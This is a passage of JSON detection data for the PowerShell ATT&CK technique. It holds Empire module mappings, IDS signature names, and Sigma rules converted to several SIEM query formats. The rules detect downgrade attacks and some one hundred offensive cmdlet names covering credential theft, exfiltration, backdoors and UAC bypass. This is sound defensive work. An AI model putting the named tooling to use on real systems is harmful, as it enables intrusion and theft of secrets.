{"cmdline": {"pattern": "hidden|-enc|-NonI"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "PowerShell", "level": "high"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1086", "Empire Module": "powershell/lateral_movement/invoke_psremoting", "Technique": "PowerShell", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_psremoting\":  [\"T1086\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1086", "Empire Module": "powershell/management/spawn", "Technique": "PowerShell", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/spawn\":  [\"T1086\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1086", "Empire Module": "python/management/multi/spawn", "Technique": "PowerShell", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/management/multi/spawn\":  [\"T1086\"],"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027168", "Verified": "Yes", "Signature": "ET POLICY Powershell Activity Over SMB - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027169", "Verified": "Yes", "Signature": "ET POLICY Powershell Command With No Profile Argument Over SMB - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027170", "Verified": "Yes", "Signature": "ET POLICY Powershell Command With Hidden Window Argument Over SMB - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027171", "Verified": "Yes", "Signature": "ET POLICY Powershell Command With Execution Bypass Argument Over SMB - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027172", "Verified": "Yes", "Signature": "ET POLICY Powershell Command With Encoded Argument Over SMB - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2027173", "Verified": "Yes", "Signature": "ET POLICY Powershell Command With NonInteractive Argument Over SMB - Likely Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2025704", "Verified": "Yes", "Signature": "ET POLICY SMB NT Create AndX Request For a Powershell .ps1 File"}}, {"0xtf/nsm-attack": {"Rules": "ET Pro", "SID": "2025705", "Verified": "Yes", "Signature": "ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"powershell.exe\"or process_path contains \"powershell_ise.exe\"or process_path contains \"psexec.exe\")", "product": "Azure Sentinel", "name": "PowerShell"}, {"query": "Sysmon| where EventID == 1and (process_command_line contains \"*.Download*\"or process_command_line contains \"*Net.WebClient*\")", "product": "Azure Sentinel", "name": "PowerShell Downloads Process"}, {"query": "title: PowerShell Downgrade Attack\nid: 6331d09b-4785-4c13-980f-f96661356249\nstatus: experimental\ndescription: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nreferences:\n    - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule), Lee Holmes (idea)\nlogsource:\n    product: windows\n    service: powershell-classic\ndetection:\n    selection:\n        EventID: 400\n        EngineVersion: '2.*'\n    filter:\n        HostVersion: '2.*' \n    condition: selection and not filter\nfalsepositives:\n    - Penetration Test\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell Downgrade Attack\nid: 6331d09b-4785-4c13-980f-f96661356249\nstatus: experimental\ndescription: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nreferences:\n    - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule), Lee Holmes (idea)\nlogsource:\n    product: windows\n    service: powershell-classic\ndetection:\n    selection:\n        EventID: 400\n        EngineVersion: '2.*'\n    filter:\n        HostVersion: '2.*' \n    condition: selection and not filter\nfalsepositives:\n    - Penetration Test\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"400\" AND EngineVersion.keyword:2.*) AND (NOT (HostVersion.keyword:2.*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Downgrade-Attack <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Downgrade Attack\",\\n    \"description\": \"Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"400\\\\\" AND EngineVersion.keyword:2.*) AND (NOT (HostVersion.keyword:2.*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"400\\\\\" AND EngineVersion.keyword:2.*) AND (NOT (HostVersion.keyword:2.*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Downgrade Attack\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"400\" AND EngineVersion.keyword:2.*) AND (NOT (HostVersion.keyword:2.*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"400\" EngineVersion=\"2.*\") NOT (HostVersion=\"2.*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"400\" EngineVersion=\"2.*\")  -(HostVersion=\"2.*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*400)(?=.*2\\\\..*)))(?=.*(?!.*(?:.*(?=.*2\\\\..*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell called from an Executable Version Mismatch\nid: c70e019b-1479-4b65-b0cc-cd0c6093a599\nstatus: experimental\ndescription: Detects PowerShell called from an executable by the version mismatch method\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell-classic\ndetection:\n    selection1:\n        EventID: 400\n        EngineVersion: \n            - '2.*'\n            - '4.*'\n            - '5.*'\n        HostVersion: '3.*'\n    condition: selection1\nfalsepositives:\n    - Penetration Tests\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell called from an Executable Version Mismatch\nid: c70e019b-1479-4b65-b0cc-cd0c6093a599\nstatus: experimental\ndescription: Detects PowerShell called from an executable by the version mismatch method\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell-classic\ndetection:\n    selection1:\n        EventID: 400\n        EngineVersion: \n            - '2.*'\n            - '4.*'\n            - '5.*'\n        HostVersion: '3.*'\n    condition: selection1\nfalsepositives:\n    - Penetration Tests\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"400\" AND EngineVersion.keyword:(2.* OR 4.* OR 5.*) AND HostVersion.keyword:3.*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-called-from-an-Executable-Version-Mismatch <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell called from an Executable Version Mismatch\",\\n    \"description\": \"Detects PowerShell called from an executable by the version mismatch method\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"400\\\\\" AND EngineVersion.keyword:(2.* OR 4.* OR 5.*) AND HostVersion.keyword:3.*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"400\\\\\" AND EngineVersion.keyword:(2.* OR 4.* OR 5.*) AND HostVersion.keyword:3.*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell called from an Executable Version Mismatch\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"400\" AND EngineVersion.keyword:(2.* 4.* 5.*) AND HostVersion.keyword:3.*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"400\" (EngineVersion=\"2.*\" OR EngineVersion=\"4.*\" OR EngineVersion=\"5.*\") HostVersion=\"3.*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"400\" EngineVersion IN [\"2.*\", \"4.*\", \"5.*\"] HostVersion=\"3.*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*400)(?=.*(?:.*2\\\\..*|.*4\\\\..*|.*5\\\\..*))(?=.*3\\\\..*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious PowerShell Commandlets\nid: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\nstatus: experimental\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nmodified: 2019/01/22\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    keywords:\n        Message:\n            - \"*Invoke-DllInjection*\"\n            - \"*Invoke-Shellcode*\"\n            - \"*Invoke-WmiCommand*\"\n            - \"*Get-GPPPassword*\"\n            - \"*Get-Keystrokes*\"\n            - \"*Get-TimedScreenshot*\"\n            - \"*Get-VaultCredential*\"\n            - \"*Invoke-CredentialInjection*\"\n            - \"*Invoke-Mimikatz*\"\n            - \"*Invoke-NinjaCopy*\"\n            - \"*Invoke-TokenManipulation*\"\n            - \"*Out-Minidump*\"\n            - \"*VolumeShadowCopyTools*\"\n            - \"*Invoke-ReflectivePEInjection*\"\n            - \"*Invoke-UserHunter*\"\n            - \"*Find-GPOLocation*\"\n            - \"*Invoke-ACLScanner*\"\n            - \"*Invoke-DowngradeAccount*\"\n            - \"*Get-ServiceUnquoted*\"\n            - \"*Get-ServiceFilePermission*\"\n            - \"*Get-ServicePermission*\"\n            - \"*Invoke-ServiceAbuse*\"\n            - \"*Install-ServiceBinary*\"\n            - \"*Get-RegAutoLogon*\"\n            - \"*Get-VulnAutoRun*\"\n            - \"*Get-VulnSchTask*\"\n            - \"*Get-UnattendedInstallFile*\"\n            - \"*Get-ApplicationHost*\"\n            - \"*Get-RegAlwaysInstallElevated*\"\n            - \"*Get-Unconstrained*\"\n            - \"*Add-RegBackdoor*\"\n            - \"*Add-ScrnSaveBackdoor*\"\n            - \"*Gupt-Backdoor*\"\n            - \"*Invoke-ADSBackdoor*\"\n            - \"*Enabled-DuplicateToken*\"\n            - \"*Invoke-PsUaCme*\"\n            - \"*Remove-Update*\"\n            - \"*Check-VM*\"\n            - \"*Get-LSASecret*\"\n            - \"*Get-PassHashes*\"\n            - \"*Show-TargetScreen*\"\n            - \"*Port-Scan*\"\n            - \"*Invoke-PoshRatHttp*\"\n            - \"*Invoke-PowerShellTCP*\"\n            - \"*Invoke-PowerShellWMI*\"\n            - \"*Add-Exfiltration*\"\n            - \"*Add-Persistence*\"\n            - \"*Do-Exfiltration*\"\n            - \"*Start-CaptureServer*\"\n            - \"*Get-ChromeDump*\"\n            - \"*Get-ClipboardContents*\"\n            - \"*Get-FoxDump*\"\n            - \"*Get-IndexedItem*\"\n            - \"*Get-Screenshot*\"\n            - \"*Invoke-Inveigh*\"\n            - \"*Invoke-NetRipper*\"\n            - \"*Invoke-EgressCheck*\"\n            - \"*Invoke-PostExfil*\"\n            - \"*Invoke-PSInject*\"\n            - \"*Invoke-RunAs*\"\n            - \"*MailRaider*\"\n            - \"*New-HoneyHash*\"\n            - \"*Set-MacAttribute*\"\n            - \"*Invoke-DCSync*\"\n            - \"*Invoke-PowerDump*\"\n            - \"*Exploit-Jboss*\"\n            - \"*Invoke-ThunderStruck*\"\n            - \"*Invoke-VoiceTroll*\"\n            - \"*Set-Wallpaper*\"\n            - \"*Invoke-InveighRelay*\"\n            - \"*Invoke-PsExec*\"\n            - \"*Invoke-SSHCommand*\"\n            - \"*Get-SecurityPackages*\"\n            - \"*Install-SSP*\"\n            - \"*Invoke-BackdoorLNK*\"\n            - \"*PowerBreach*\"\n            - \"*Get-SiteListPassword*\"\n            - \"*Get-System*\"\n            - \"*Invoke-BypassUAC*\"\n            - \"*Invoke-Tater*\"\n            - \"*Invoke-WScriptBypassUAC*\"\n            - \"*PowerUp*\"\n            - \"*PowerView*\"\n            - \"*Get-RickAstley*\"\n            - \"*Find-Fruit*\"\n            - \"*HTTP-Login*\"\n            - \"*Find-TrustedDocuments*\"\n            - \"*Invoke-Paranoia*\"\n            - \"*Invoke-WinEnum*\"\n            - \"*Invoke-ARPScan*\"\n            - \"*Invoke-PortScan*\"\n            - \"*Invoke-ReverseDNSLookup*\"\n            - \"*Invoke-SMBScanner*\"\n            - \"*Invoke-Mimikittenz*\"\n    false_positives:\n        - Get-SystemDriveInfo  # http://bheltborg.dk/Windows/WinSxS/amd64_microsoft-windows-maintenancediagnostic_31bf3856ad364e35_10.0.10240.16384_none_91ef7543a4514b5e/CL_Utility.ps1\n    condition: keywords and not false_positives\nfalsepositives:\n    - Penetration testing\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious PowerShell Commandlets\nid: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\nstatus: experimental\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nmodified: 2019/01/22\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    keywords:\n        Message:\n            - \"*Invoke-DllInjection*\"\n            - \"*Invoke-Shellcode*\"\n            - \"*Invoke-WmiCommand*\"\n            - \"*Get-GPPPassword*\"\n            - \"*Get-Keystrokes*\"\n            - \"*Get-TimedScreenshot*\"\n            - \"*Get-VaultCredential*\"\n            - \"*Invoke-CredentialInjection*\"\n            - \"*Invoke-Mimikatz*\"\n            - \"*Invoke-NinjaCopy*\"\n            - \"*Invoke-TokenManipulation*\"\n            - \"*Out-Minidump*\"\n            - \"*VolumeShadowCopyTools*\"\n            - \"*Invoke-ReflectivePEInjection*\"\n            - \"*Invoke-UserHunter*\"\n            - \"*Find-GPOLocation*\"\n            - \"*Invoke-ACLScanner*\"\n            - \"*Invoke-DowngradeAccount*\"\n            - \"*Get-ServiceUnquoted*\"\n            - \"*Get-ServiceFilePermission*\"\n            - \"*Get-ServicePermission*\"\n            - \"*Invoke-ServiceAbuse*\"\n            - \"*Install-ServiceBinary*\"\n            - \"*Get-RegAutoLogon*\"\n            - \"*Get-VulnAutoRun*\"\n            - \"*Get-VulnSchTask*\"\n            - \"*Get-UnattendedInstallFile*\"\n            - \"*Get-ApplicationHost*\"\n            - \"*Get-RegAlwaysInstallElevated*\"\n            - \"*Get-Unconstrained*\"\n            - \"*Add-RegBackdoor*\"\n            - \"*Add-ScrnSaveBackdoor*\"\n            - \"*Gupt-Backdoor*\"\n            - \"*Invoke-ADSBackdoor*\"\n            - \"*Enabled-DuplicateToken*\"\n            - \"*Invoke-PsUaCme*\"\n            - \"*Remove-Update*\"\n            - \"*Check-VM*\"\n            - \"*Get-LSASecret*\"\n            - \"*Get-PassHashes*\"\n            - \"*Show-TargetScreen*\"\n            - \"*Port-Scan*\"\n            - \"*Invoke-PoshRatHttp*\"\n            - \"*Invoke-PowerShellTCP*\"\n            - \"*Invoke-PowerShellWMI*\"\n            - \"*Add-Exfiltration*\"\n            - \"*Add-Persistence*\"\n            - \"*Do-Exfiltration*\"\n            - \"*Start-CaptureServer*\"\n            - \"*Get-ChromeDump*\"\n            - \"*Get-ClipboardContents*\"\n            - \"*Get-FoxDump*\"\n            - \"*Get-IndexedItem*\"\n            - \"*Get-Screenshot*\"\n            - \"*Invoke-Inveigh*\"\n            - \"*Invoke-NetRipper*\"\n            - \"*Invoke-EgressCheck*\"\n            - \"*Invoke-PostExfil*\"\n            - \"*Invoke-PSInject*\"\n            - \"*Invoke-RunAs*\"\n            - \"*MailRaider*\"\n            - \"*New-HoneyHash*\"\n            - \"*Set-MacAttribute*\"\n            - \"*Invoke-DCSync*\"\n            - \"*Invoke-PowerDump*\"\n            - \"*Exploit-Jboss*\"\n            - \"*Invoke-ThunderStruck*\"\n            - \"*Invoke-VoiceTroll*\"\n            - \"*Set-Wallpaper*\"\n            - \"*Invoke-InveighRelay*\"\n            - \"*Invoke-PsExec*\"\n            - \"*Invoke-SSHCommand*\"\n            - \"*Get-SecurityPackages*\"\n            - \"*Install-SSP*\"\n            - \"*Invoke-BackdoorLNK*\"\n            - \"*PowerBreach*\"\n            - \"*Get-SiteListPassword*\"\n            - \"*Get-System*\"\n            - \"*Invoke-BypassUAC*\"\n            - \"*Invoke-Tater*\"\n            - \"*Invoke-WScriptBypassUAC*\"\n            - \"*PowerUp*\"\n            - \"*PowerView*\"\n            - \"*Get-RickAstley*\"\n            - \"*Find-Fruit*\"\n            - \"*HTTP-Login*\"\n            - \"*Find-TrustedDocuments*\"\n            - \"*Invoke-Paranoia*\"\n            - \"*Invoke-WinEnum*\"\n            - \"*Invoke-ARPScan*\"\n            - \"*Invoke-PortScan*\"\n            - \"*Invoke-ReverseDNSLookup*\"\n            - \"*Invoke-SMBScanner*\"\n            - \"*Invoke-Mimikittenz*\"\n    false_positives:\n        - Get-SystemDriveInfo  # http://bheltborg.dk/Windows/WinSxS/amd64_microsoft-windows-maintenancediagnostic_31bf3856ad364e35_10.0.10240.16384_none_91ef7543a4514b5e/CL_Utility.ps1\n    condition: keywords and not false_positives\nfalsepositives:\n    - Penetration testing\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Message.keyword:(*Invoke\\\\-DllInjection* OR *Invoke\\\\-Shellcode* OR *Invoke\\\\-WmiCommand* OR *Get\\\\-GPPPassword* OR *Get\\\\-Keystrokes* OR *Get\\\\-TimedScreenshot* OR *Get\\\\-VaultCredential* OR *Invoke\\\\-CredentialInjection* OR *Invoke\\\\-Mimikatz* OR *Invoke\\\\-NinjaCopy* OR *Invoke\\\\-TokenManipulation* OR *Out\\\\-Minidump* OR *VolumeShadowCopyTools* OR *Invoke\\\\-ReflectivePEInjection* OR *Invoke\\\\-UserHunter* OR *Find\\\\-GPOLocation* OR *Invoke\\\\-ACLScanner* OR *Invoke\\\\-DowngradeAccount* OR *Get\\\\-ServiceUnquoted* OR *Get\\\\-ServiceFilePermission* OR *Get\\\\-ServicePermission* OR *Invoke\\\\-ServiceAbuse* OR *Install\\\\-ServiceBinary* OR *Get\\\\-RegAutoLogon* OR *Get\\\\-VulnAutoRun* OR *Get\\\\-VulnSchTask* OR *Get\\\\-UnattendedInstallFile* OR *Get\\\\-ApplicationHost* OR *Get\\\\-RegAlwaysInstallElevated* OR *Get\\\\-Unconstrained* OR *Add\\\\-RegBackdoor* OR *Add\\\\-ScrnSaveBackdoor* OR *Gupt\\\\-Backdoor* OR *Invoke\\\\-ADSBackdoor* OR *Enabled\\\\-DuplicateToken* OR *Invoke\\\\-PsUaCme* OR *Remove\\\\-Update* OR *Check\\\\-VM* OR *Get\\\\-LSASecret* OR *Get\\\\-PassHashes* OR *Show\\\\-TargetScreen* OR *Port\\\\-Scan* OR *Invoke\\\\-PoshRatHttp* OR *Invoke\\\\-PowerShellTCP* OR *Invoke\\\\-PowerShellWMI* OR *Add\\\\-Exfiltration* OR *Add\\\\-Persistence* OR *Do\\\\-Exfiltration* OR *Start\\\\-CaptureServer* OR *Get\\\\-ChromeDump* OR *Get\\\\-ClipboardContents* OR *Get\\\\-FoxDump* OR *Get\\\\-IndexedItem* OR *Get\\\\-Screenshot* OR *Invoke\\\\-Inveigh* OR *Invoke\\\\-NetRipper* OR *Invoke\\\\-EgressCheck* OR *Invoke\\\\-PostExfil* OR *Invoke\\\\-PSInject* OR *Invoke\\\\-RunAs* OR *MailRaider* OR *New\\\\-HoneyHash* OR *Set\\\\-MacAttribute* OR *Invoke\\\\-DCSync* OR *Invoke\\\\-PowerDump* OR *Exploit\\\\-Jboss* OR *Invoke\\\\-ThunderStruck* OR *Invoke\\\\-VoiceTroll* OR *Set\\\\-Wallpaper* OR *Invoke\\\\-InveighRelay* OR *Invoke\\\\-PsExec* OR *Invoke\\\\-SSHCommand* OR *Get\\\\-SecurityPackages* OR *Install\\\\-SSP* OR *Invoke\\\\-BackdoorLNK* OR *PowerBreach* OR *Get\\\\-SiteListPassword* OR *Get\\\\-System* OR *Invoke\\\\-BypassUAC* OR *Invoke\\\\-Tater* OR *Invoke\\\\-WScriptBypassUAC* OR *PowerUp* OR *PowerView* OR *Get\\\\-RickAstley* OR *Find\\\\-Fruit* OR *HTTP\\\\-Login* OR *Find\\\\-TrustedDocuments* OR *Invoke\\\\-Paranoia* OR *Invoke\\\\-WinEnum* OR *Invoke\\\\-ARPScan* OR *Invoke\\\\-PortScan* OR *Invoke\\\\-ReverseDNSLookup* OR *Invoke\\\\-SMBScanner* OR *Invoke\\\\-Mimikittenz*) AND (NOT \\\\*.keyword:(*Get\\\\-SystemDriveInfo*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Malicious-PowerShell-Commandlets <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Malicious PowerShell Commandlets\",\\n    \"description\": \"Detects Commandlet names from well-known PowerShell exploitation frameworks\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(Message.keyword:(*Invoke\\\\\\\\-DllInjection* OR *Invoke\\\\\\\\-Shellcode* OR *Invoke\\\\\\\\-WmiCommand* OR *Get\\\\\\\\-GPPPassword* OR *Get\\\\\\\\-Keystrokes* OR *Get\\\\\\\\-TimedScreenshot* OR *Get\\\\\\\\-VaultCredential* OR *Invoke\\\\\\\\-CredentialInjection* OR *Invoke\\\\\\\\-Mimikatz* OR *Invoke\\\\\\\\-NinjaCopy* OR *Invoke\\\\\\\\-TokenManipulation* OR *Out\\\\\\\\-Minidump* OR *VolumeShadowCopyTools* OR *Invoke\\\\\\\\-ReflectivePEInjection* OR *Invoke\\\\\\\\-UserHunter* OR *Find\\\\\\\\-GPOLocation* OR *Invoke\\\\\\\\-ACLScanner* OR *Invoke\\\\\\\\-DowngradeAccount* OR *Get\\\\\\\\-ServiceUnquoted* OR *Get\\\\\\\\-ServiceFilePermission* OR *Get\\\\\\\\-ServicePermission* OR *Invoke\\\\\\\\-ServiceAbuse* OR *Install\\\\\\\\-ServiceBinary* OR *Get\\\\\\\\-RegAutoLogon* OR *Get\\\\\\\\-VulnAutoRun* OR *Get\\\\\\\\-VulnSchTask* OR *Get\\\\\\\\-UnattendedInstallFile* OR *Get\\\\\\\\-ApplicationHost* OR *Get\\\\\\\\-RegAlwaysInstallElevated* OR *Get\\\\\\\\-Unconstrained* OR *Add\\\\\\\\-RegBackdoor* OR *Add\\\\\\\\-ScrnSaveBackdoor* OR *Gupt\\\\\\\\-Backdoor* OR *Invoke\\\\\\\\-ADSBackdoor* OR *Enabled\\\\\\\\-DuplicateToken* OR *Invoke\\\\\\\\-PsUaCme* OR *Remove\\\\\\\\-Update* OR *Check\\\\\\\\-VM* OR *Get\\\\\\\\-LSASecret* OR *Get\\\\\\\\-PassHashes* OR *Show\\\\\\\\-TargetScreen* OR *Port\\\\\\\\-Scan* OR *Invoke\\\\\\\\-PoshRatHttp* OR *Invoke\\\\\\\\-PowerShellTCP* OR *Invoke\\\\\\\\-PowerShellWMI* OR *Add\\\\\\\\-Exfiltration* OR *Add\\\\\\\\-Persistence* OR *Do\\\\\\\\-Exfiltration* OR *Start\\\\\\\\-CaptureServer* OR *Get\\\\\\\\-ChromeDump* OR *Get\\\\\\\\-ClipboardContents* OR *Get\\\\\\\\-FoxDump* OR *Get\\\\\\\\-IndexedItem* OR *Get\\\\\\\\-Screenshot* OR *Invoke\\\\\\\\-Inveigh* OR *Invoke\\\\\\\\-NetRipper* OR *Invoke\\\\\\\\-EgressCheck* OR *Invoke\\\\\\\\-PostExfil* OR *Invoke\\\\\\\\-PSInject* OR *Invoke\\\\\\\\-RunAs* OR *MailRaider* OR *New\\\\\\\\-HoneyHash* OR *Set\\\\\\\\-MacAttribute* OR *Invoke\\\\\\\\-DCSync* OR *Invoke\\\\\\\\-PowerDump* OR *Exploit\\\\\\\\-Jboss* OR *Invoke\\\\\\\\-ThunderStruck* OR *Invoke\\\\\\\\-VoiceTroll* OR *Set\\\\\\\\-Wallpaper* OR *Invoke\\\\\\\\-InveighRelay* OR *Invoke\\\\\\\\-PsExec* OR *Invoke\\\\\\\\-SSHCommand* OR *Get\\\\\\\\-SecurityPackages* OR *Install\\\\\\\\-SSP* OR *Invoke\\\\\\\\-BackdoorLNK* OR *PowerBreach* OR *Get\\\\\\\\-SiteListPassword* OR *Get\\\\\\\\-System* OR *Invoke\\\\\\\\-BypassUAC* OR *Invoke\\\\\\\\-Tater* OR *Invoke\\\\\\\\-WScriptBypassUAC* OR *PowerUp* OR *PowerView* OR *Get\\\\\\\\-RickAstley* OR *Find\\\\\\\\-Fruit* OR *HTTP\\\\\\\\-Login* OR *Find\\\\\\\\-TrustedDocuments* OR *Invoke\\\\\\\\-Paranoia* OR *Invoke\\\\\\\\-WinEnum* OR *Invoke\\\\\\\\-ARPScan* OR *Invoke\\\\\\\\-PortScan* OR *Invoke\\\\\\\\-ReverseDNSLookup* OR *Invoke\\\\\\\\-SMBScanner* OR *Invoke\\\\\\\\-Mimikittenz*) AND (NOT \\\\\\\\*.keyword:(*Get\\\\\\\\-SystemDriveInfo*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Message.keyword:(*Invoke\\\\\\\\-DllInjection* OR *Invoke\\\\\\\\-Shellcode* OR *Invoke\\\\\\\\-WmiCommand* OR *Get\\\\\\\\-GPPPassword* OR *Get\\\\\\\\-Keystrokes* OR *Get\\\\\\\\-TimedScreenshot* OR *Get\\\\\\\\-VaultCredential* OR *Invoke\\\\\\\\-CredentialInjection* OR *Invoke\\\\\\\\-Mimikatz* OR *Invoke\\\\\\\\-NinjaCopy* OR *Invoke\\\\\\\\-TokenManipulation* OR 